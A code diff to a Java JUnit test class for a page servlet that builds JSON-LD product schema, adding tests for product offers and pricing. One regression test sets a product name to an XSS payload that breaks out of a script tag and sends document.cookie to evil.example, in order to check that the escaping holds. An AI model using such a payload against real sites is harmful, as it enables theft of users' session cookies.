@@ -23,6 +23,7 @@ import static org.junit.jupiter.api.Assertions.assertNull;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 import static org.mockito.Mockito.mockStatic;
 
+import java.math.BigDecimal;
 import java.sql.Timestamp;
 import java.util.ArrayList;
 import java.util.Collections;
@@ -75,10 +76,17 @@ class PageServletTest {
   }
 
   @Test
-  void generateJsonLdDataEscapesAPoisonedItemName() {
+  void generateJsonLdDataEscapesAPoisonedProductName() {
+    // Regression test for issue #403: this used to poison an Item name to reach the Product
+    // block, back when Product was (incorrectly) sourced from the generic Items/Collections
+    // system. Product is now sourced from pageRenderInfo's bridged product fields instead (see
+    // computeProductSchema), so the poison goes in there -- the security property under test
+    // (escapeForInlineScript covers the whole serialized object) is unchanged either way.
     PageRenderInfo pageRenderInfo = new PageRenderInfo();
     pageRenderInfo.setPageUrl("https://example.org/products/widget");
     pageRenderInfo.setTitle("Widget");
+    pageRenderInfo.setProductName("</script><script>fetch('https://evil.example/steal?c='+document.cookie)</script>");
+    pageRenderInfo.setProductDescription("Also \"quoted\" and <b>bold</b>");
 
     Map<String, String> sitePropertyMap = new HashMap<>();
     sitePropertyMap.put("site.name", "Example Co");
@@ -98,8 +106,8 @@ class PageServletTest {
     }
 
     assertFalse(jsonLd.toLowerCase().contains("</script"),
-        "a poisoned item name must not be able to close the surrounding <script> tag: " + jsonLd);
-    assertFalse(jsonLd.contains("<script>"), "a poisoned item name must not open a new <script> tag: " + jsonLd);
+        "a poisoned product name must not be able to close the surrounding <script> tag: " + jsonLd);
+    assertFalse(jsonLd.contains("<script>"), "a poisoned product name must not open a new <script> tag: " + jsonLd);
 
     // Still valid, semantically unchanged JSON once parsed
     JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
@@ -107,6 +115,66 @@ class PageServletTest {
     JsonNode product = parsed.get("@graph").get(3);
     assertEquals("Product", product.get("@type").asText());
     assertTrue(product.get("name").asText().contains("</script><script>"));
+  }
+
+  @Test
+  void computeProductSchemaReturnsNullWhenNotAProductPage() {
+    // productName is only ever set by an ecommerce widget like ProductNameWidget; a plain page
+    // must not get a fabricated Product entry
+    assertNull(PageServlet.computeProductSchema(new PageRenderInfo(), "https://example.org"));
+  }
+
+  @Test
+  void computeProductSchemaIncludesASingleOfferForAOneSkuProduct() {
+    PageRenderInfo pageRenderInfo = new PageRenderInfo();
+    pageRenderInfo.setProductName("Widget");
+    pageRenderInfo.setProductDescription("A fine widget");
+    pageRenderInfo.setProductImageUrl("/images/widget.jpg");
+    pageRenderInfo.setProductPrice(new BigDecimal("19.99"));
+    pageRenderInfo.setProductCurrency("USD");
+    pageRenderInfo.setProductAvailability("https://schema.org/InStock");
+
+    Map<String, Object> product = PageServlet.computeProductSchema(pageRenderInfo, "https://example.org");
+
+    assertEquals("Product", product.get("@type"));
+    assertEquals("Widget", product.get("name"));
+    assertEquals("A fine widget", product.get("description"));
+    assertEquals("https://example.org/images/widget.jpg", product.get("image"));
+
+    @SuppressWarnings("unchecked")
+    Map<String, Object> offer = (Map<String, Object>) product.get("offers");
+    assertEquals("Offer", offer.get("@type"));
+    assertEquals("19.99", offer.get("price"));
+    assertEquals("USD", offer.get("priceCurrency"));
+    assertEquals("https://schema.org/InStock", offer.get("availability"));
+  }
+
+  @Test
+  void computeProductSchemaIncludesAnAggregateOfferForAMultiSkuProduct() {
+    PageRenderInfo pageRenderInfo = new PageRenderInfo();
+    pageRenderInfo.setProductName("Widget");
+    pageRenderInfo.setProductLowPrice(new BigDecimal("9.99"));
+    pageRenderInfo.setProductOfferCount(3);
+    pageRenderInfo.setProductCurrency("USD");
+
+    Map<String, Object> product = PageServlet.computeProductSchema(pageRenderInfo, "https://example.org");
+
+    @SuppressWarnings("unchecked")
+    Map<String, Object> offer = (Map<String, Object>) product.get("offers");
+    assertEquals("AggregateOffer", offer.get("@type"));
+    assertEquals("9.99", offer.get("lowPrice"));
+    assertEquals(3, offer.get("offerCount"));
+    assertEquals("USD", offer.get("priceCurrency"));
+  }
+
+  @Test
+  void computeProductSchemaOmitsOffersWhenNoPriceIsSet() {
+    PageRenderInfo pageRenderInfo = new PageRenderInfo();
+    pageRenderInfo.setProductName("Widget");
+
+    Map<String, Object> product = PageServlet.computeProductSchema(pageRenderInfo, "https://example.org");
+
+    assertNull(product.get("offers"));
   }
 
   @Test
